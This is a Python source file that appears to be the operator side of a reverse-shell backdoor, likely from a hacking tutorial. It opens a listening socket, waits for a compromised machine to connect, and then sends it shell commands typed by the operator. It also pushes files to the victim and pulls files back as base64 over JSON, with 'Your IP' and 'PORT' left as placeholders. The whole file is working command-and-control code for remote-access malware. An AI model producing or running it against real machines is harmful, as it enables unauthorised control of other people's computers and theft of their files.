import socket
import simplejson
import base64


class Listener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening .... ")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK" + str(my_address))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_exec(self, command_in):
        self.json_send(command_in)

        if command_in[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_recv()

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_in = input("Enter command: ")
            command_in = command_in.split(" ")
            try:
                if command_in[0] == "upload":
                    my_file_content = self.get_file_content(command_in[1])
                    command_in.append(my_file_content)

                command_output = self.command_exec(command_in)

                if command_in[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_in[1], command_output)
            except Exception:
                command_output = "Error"
            print(command_output)


my_sock_listener = Listener("Your IP", "PORT")
my_sock_listener.start_listener()
